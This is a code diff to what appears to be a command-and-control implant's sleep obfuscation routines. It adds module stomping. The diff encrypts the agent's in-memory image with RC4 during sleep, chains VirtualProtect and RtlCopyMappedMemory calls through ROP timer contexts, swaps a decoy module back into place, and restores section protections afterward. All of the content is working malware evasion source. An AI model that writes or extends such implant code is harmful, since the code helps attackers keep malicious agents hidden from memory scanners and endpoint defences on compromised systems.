@@ -104,6 +104,9 @@ VOID FoliageObf(
     for ( SHORT i = 0; i < 16; i++ )
         Random[ i ] = RandomNumber32( );
 
+    NtHeaders = C_PTR( ImageBase + ( ( PIMAGE_DOS_HEADER ) ImageBase )->e_lfanew );
+    SecHeader = IMAGE_FIRST_SECTION( NtHeaders );
+    NumberOfSections = NtHeaders->FileHeader.NumberOfSections;
     //if module stomping is enabled
     if(Instance.Session.Rc4StompedModule.Buffer != NULL) {
         //Copying payload to other location
@@ -654,13 +657,15 @@ BOOL TimerObf(
     UCHAR   Buf[ 16 ] = { 0 };
     USTRING Key       = { 0 };
     USTRING Img       = { 0 };
+    USTRING KeyStomped  = { 0 };
+    USTRING Rc4Stomped  = { 0 };
     PVOID   ImgBase   = { 0 };
     ULONG   ImgSize   = { 0 };
 
     /* rop/thread contexts */
     CONTEXT TimerCtx  = { 0 };
     CONTEXT ThdCtx    = { 0 };
-    CONTEXT Rop[ 13 ] = { { 0 } };
+    CONTEXT Rop[ 50 ] = { { 0 } };
 
     /* some vars */
     DWORD    Value     = 0;
@@ -670,6 +675,10 @@ BOOL TimerObf(
     NT_TIB   BkpTib    = { 0 };
     NTSTATUS NtStatus  = STATUS_SUCCESS;
     DWORD    Inc       = 0;
+    PIMAGE_NT_HEADERS       NtHeaders       = NULL;
+    PIMAGE_SECTION_HEADER   SecHeader       = NULL;
+    DWORD NumberOfSections = 0;
+    PPAGEPROTECT_PARAM PageProtectParams = {0};
 
     LPVOID              ImageBase   = NULL;
     SIZE_T              ImageSize   = 0;
@@ -680,29 +689,65 @@ BOOL TimerObf(
     ImageBase = Instance.Session.ModuleBase;
     ImageSize = Instance.Session.ModuleSize;
 
+    NtHeaders = C_PTR( ImageBase + ( ( PIMAGE_DOS_HEADER ) ImageBase )->e_lfanew );
+    SecHeader = IMAGE_FIRST_SECTION( NtHeaders );
+    NumberOfSections = NtHeaders->FileHeader.NumberOfSections;
+    PageProtectParams = Instance.Win32.LocalAlloc( LPTR, sizeof( PAGEPROTECT_PARAM )*NumberOfSections );
+
     // Check if .text section is defined
-    if (Instance.Session.TxtBase != 0 && Instance.Session.TxtSize != 0) {
-        TxtBase = Instance.Session.TxtBase;
-        TxtSize = Instance.Session.TxtSize;
-        dwProtect  = PAGE_EXECUTE_READ;
-    } else {
-        TxtBase = Instance.Session.ModuleBase;
-        TxtSize = Instance.Session.ModuleSize;
-    }
+//    if (Instance.Session.TxtBase != 0 && Instance.Session.TxtSize != 0) {
+//        TxtBase = Instance.Session.TxtBase;
+//        TxtSize = Instance.Session.TxtSize;
+//        dwProtect  = PAGE_EXECUTE_READ;
+//    } else {
+//        TxtBase = Instance.Session.ModuleBase;
+//        TxtSize = Instance.Session.ModuleSize;
+//    }
 
     /* create a random key */
     for ( BYTE i = 0; i < 16; i++ ) {
         Buf[ i ] = RandomNumber32( );
     }
 
-    /* set key pointer and size */
-    Key.Buffer = Buf;
-    Key.Length = Key.MaximumLength = sizeof( Buf );
+    //if module stomping is enabled
+    if(Instance.Session.Rc4StompedModule.Buffer != NULL) {
+        //Copying payload to other location
+        MemCopy(Instance.Session.Rc4PayloadModule.Buffer, ImageBase, ImageSize);
+        //generating random key
+        for (SHORT i = 0; i < KEYSIZE; i++)
+            ((PBYTE) (Instance.Session.KeyPayloadModule.Buffer))[i] = RandomNumber32();
+        //encrypting copy of payload
+        Instance.Win32.SystemFunction032(&(Instance.Session.Rc4PayloadModule), &(Instance.Session.KeyPayloadModule));
 
-    /* set agent memory pointer and size */
-    Img.Buffer = ImgBase           = Instance.Session.ModuleBase;
-    Img.Length = Img.MaximumLength = ImgSize = Instance.Session.ModuleSize;
+        //storing encrypted payload info in stack
+        Key.Buffer = Instance.Session.KeyPayloadModule.Buffer;
+        Key.Length = Key.MaximumLength = Instance.Session.KeyPayloadModule.Length;
 
+        Img.Buffer = Instance.Session.Rc4PayloadModule.Buffer;
+        Img.Length = Img.MaximumLength = Instance.Session.Rc4PayloadModule.Length;
+
+
+        //Decrypting stomped module
+        Instance.Win32.SystemFunction032(&(Instance.Session.Rc4StompedModule),&(Instance.Session.KeyStompedModule));
+
+        //saving stomped module info in stack
+        Rc4Stomped.Buffer = Instance.Session.Rc4StompedModule.Buffer;
+        Rc4Stomped.Length = Instance.Session.Rc4StompedModule.Length;
+        Rc4Stomped.MaximumLength = Instance.Session.Rc4StompedModule.MaximumLength;
+
+        KeyStomped.Buffer = Instance.Session.KeyStompedModule.Buffer;
+        KeyStomped.Length = Instance.Session.KeyStompedModule.Length;
+        KeyStomped.MaximumLength = Instance.Session.KeyStompedModule.MaximumLength;
+    }
+    else {
+        /* set key pointer and size */
+        Key.Buffer = Buf;
+        Key.Length = Key.MaximumLength = sizeof(Buf);
+
+        /* set agent memory pointer and size */
+        Img.Buffer = ImgBase = Instance.Session.ModuleBase;
+        Img.Length = Img.MaximumLength = ImgSize = Instance.Session.ModuleSize;
+    }
     if ( Method == SLEEPOBF_EKKO ) {
         NtStatus = Instance.Win32.RtlCreateTimerQueue( &Queue );
     } else if ( Method == SLEEPOBF_ZILEAN ) {
@@ -760,7 +805,7 @@ BOOL TimerObf(
                     }
 
                     /* at this point we can start preparing the ROPs and execute the timers */
-                    for ( int i = 0; i < 13; i++ ) {
+                    for ( int i = 0; i < 50; i++ ) {
                         MemCopy( &Rop[ i ], &TimerCtx, sizeof( CONTEXT ) );
                         Rop[ i ].Rsp -= sizeof( PVOID );
                     }
@@ -776,19 +821,55 @@ BOOL TimerObf(
                     Rop[ Inc ].R8  = U_PTR( FALSE );
                     Inc++;
 
-                    /* Protect */
-                    Rop[ Inc ].Rip = U_PTR( Instance.Win32.VirtualProtect );
-                    Rop[ Inc ].Rcx = U_PTR( ImgBase );
-                    Rop[ Inc ].Rdx = U_PTR( ImgSize );
-                    Rop[ Inc ].R8  = U_PTR( PAGE_READWRITE );
-                    Rop[ Inc ].R9  = U_PTR( &Value );
-                    Inc++;
+                    //If Module Stomping is enabled
+                    if(Rc4Stomped.Buffer != NULL){
+                        /* Protect */
+                        Rop[ Inc ].Rip = U_PTR( Instance.Win32.VirtualProtect );
+                        Rop[ Inc ].Rcx = U_PTR( ImgBase );
+                        //TODO: replace ImageSize with Rc4Stomped.Length
+                        Rop[ Inc ].Rdx = U_PTR( ImgSize );
+                        Rop[ Inc ].R8  = U_PTR( PAGE_READWRITE );
+                        Rop[ Inc ].R9  = U_PTR( &Value );
+                        Inc++;
 
-                    /* Encrypt image base address */
-                    Rop[ Inc ].Rip = U_PTR( Instance.Win32.SystemFunction032 );
-                    Rop[ Inc ].Rcx = U_PTR( &Img );
-                    Rop[ Inc ].Rdx = U_PTR( &Key );
-                    Inc++;
+                        /*Copy back stomped module*/
+                        Rop[ Inc ].Rip = U_PTR( Instance.Win32.RtlCopyMappedMemory );
+                        Rop[ Inc ].Rcx = U_PTR( ImageBase );
+                        Rop[ Inc ].Rdx = U_PTR( Rc4Stomped.Buffer );
+                        //TODO: replace ImageSize with Rc4Stomped.Length
+                        Rop[ Inc ].R8  = U_PTR( ImageSize );
+                        Inc++;
+
+                        /*Encrypt copy of stomped module*/
+                        Rop[ Inc ].Rip = U_PTR( Instance.Win32.SystemFunction032 );
+                        Rop[ Inc ].Rcx = U_PTR( &Rc4Stomped );
+                        Rop[ Inc ].Rdx = U_PTR( &KeyStomped );
+                        Inc++;
+
+                        /*Restore stomped module pages to RX*/
+                        Rop[ Inc ].Rip = U_PTR( Instance.Win32.VirtualProtect );
+                        Rop[ Inc ].Rcx = U_PTR( ImgBase );
+                        //TODO: replace ImageSize with Rc4Stomped.Length
+                        Rop[ Inc ].Rdx = U_PTR( ImgSize );
+                        Rop[ Inc ].R8  = U_PTR( PAGE_EXECUTE_READ );
+                        Rop[ Inc ].R9  = U_PTR( &Value );
+                        Inc++;
+                    }
+                    else{
+                        /* Protect */
+                        Rop[ Inc ].Rip = U_PTR( Instance.Win32.VirtualProtect );
+                        Rop[ Inc ].Rcx = U_PTR( ImgBase );
+                        Rop[ Inc ].Rdx = U_PTR( ImgSize );
+                        Rop[ Inc ].R8  = U_PTR( PAGE_READWRITE );
+                        Rop[ Inc ].R9  = U_PTR( &Value );
+                        Inc++;
+
+                        /* Encrypt image base address */
+                        Rop[ Inc ].Rip = U_PTR( Instance.Win32.SystemFunction032 );
+                        Rop[ Inc ].Rcx = U_PTR( &Img );
+                        Rop[ Inc ].Rdx = U_PTR( &Key );
+                        Inc++;
+                    }
 
                     /* perform stack spoofing */
                     if ( Instance.Config.Implant.StackSpoof ) {
@@ -835,20 +916,75 @@ BOOL TimerObf(
                         Rop[ Inc ].Rdx = U_PTR( &ThdCtx );
                         Inc++;
                     }
+                    if(Rc4Stomped.Buffer != NULL){
+                        /*Decrypt copy of payload*/
+                        Rop[ Inc ].Rip = U_PTR( Instance.Win32.SystemFunction032 );
+                        Rop[ Inc ].Rcx = U_PTR( &Img );
+                        Rop[ Inc ].Rdx = U_PTR( &Key );
+                        Inc++;
 
-                    /* Sys032 */
-                    Rop[ Inc ].Rip = U_PTR( Instance.Win32.SystemFunction032 );
-                    Rop[ Inc ].Rcx = U_PTR( &Img );
-                    Rop[ Inc ].Rdx = U_PTR( &Key );
-                    Inc++;
+                        /*Reset pages to rw*/
+                        Rop[ Inc ].Rip = U_PTR( Instance.Win32.VirtualProtect );
+                        Rop[ Inc ].Rcx = U_PTR( ImageBase );
+                        Rop[ Inc ].Rdx = U_PTR( ImageSize );
+                        Rop[ Inc ].R8  = U_PTR( PAGE_READWRITE );
+                        Rop[ Inc ].R9  = U_PTR( &Value );
+                        Inc++;
 
-                    /* Protect */
-                    Rop[ Inc ].Rip = U_PTR( Instance.Win32.VirtualProtect );
-                    Rop[ Inc ].Rcx = U_PTR( TxtBase );
-                    Rop[ Inc ].Rdx = U_PTR( TxtSize );
-                    Rop[ Inc ].R8  = U_PTR( dwProtect );
-                    Rop[ Inc ].R9  = U_PTR( &Value );
-                    Inc++;
+                        /*copy decrypted payload to ImageBase*/
+                        Rop[ Inc ].Rip = U_PTR( Instance.Win32.RtlCopyMappedMemory );
+                        Rop[ Inc ].Rcx = U_PTR( ImageBase );
+                        Rop[ Inc ].Rdx = U_PTR( Img.Buffer );
+                        Rop[ Inc ].R8  = U_PTR( ImageSize );
+                        Inc++;
+                    }
+                    else {
+                        /* Sys032 */
+                        Rop[Inc].Rip = U_PTR(Instance.Win32.SystemFunction032);
+                        Rop[Inc].Rcx = U_PTR(&Img);
+                        Rop[Inc].Rdx = U_PTR(&Key);
+                        Inc++;
+                    }
+                    /* Protect with original permissions*/
+                    for (int i = 0; i < NumberOfSections; i++) {
+                        PageProtectParams[i].SecMemory = C_PTR(ImageBase + SecHeader[i].VirtualAddress);
+                        PageProtectParams[i].SecMemorySize = SecHeader[i].SizeOfRawData;
+                        PageProtectParams[i].Protection = 0;
+                        PageProtectParams[i].OldProtection = 0;
+
+                        if (SecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE)
+                            PageProtectParams[i].Protection = PAGE_WRITECOPY;
+
+                        if (SecHeader[i].Characteristics & IMAGE_SCN_MEM_READ)
+                            PageProtectParams[i].Protection = PAGE_READONLY;
+
+                        if ((SecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE) &&
+                            (SecHeader[i].Characteristics & IMAGE_SCN_MEM_READ))
+                            PageProtectParams[i].Protection = PAGE_READWRITE;
+
+                        if (SecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
+                            PageProtectParams[i].Protection = PAGE_EXECUTE;
+
+                        if ((SecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
+                            (SecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE))
+                            PageProtectParams[i].Protection = PAGE_EXECUTE_WRITECOPY;
+
+                        if ((SecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
+                            (SecHeader[i].Characteristics & IMAGE_SCN_MEM_READ)) {
+                            PageProtectParams[i].Protection = PAGE_EXECUTE_READ;
+                        }
+                        if ((SecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
+                            (SecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE) &&
+                            (SecHeader[i].Characteristics & IMAGE_SCN_MEM_READ))
+                            PageProtectParams[i].Protection = PAGE_EXECUTE_READWRITE;
+
+                        Rop[ Inc ].Rip = U_PTR( Instance.Win32.VirtualProtect );
+                        Rop[ Inc ].Rcx = U_PTR( PageProtectParams[i].SecMemory );
+                        Rop[ Inc ].Rdx = U_PTR( PageProtectParams[i].SecMemorySize );
+                        Rop[ Inc ].R8  = U_PTR( PageProtectParams[i].Protection );
+                        Rop[ Inc ].R9  = U_PTR( &Value );
+                        Inc++;
+                    }
 
                     /* End of Ropchain */
                     Rop[ Inc ].Rip = U_PTR( Instance.Win32.NtSetEvent );
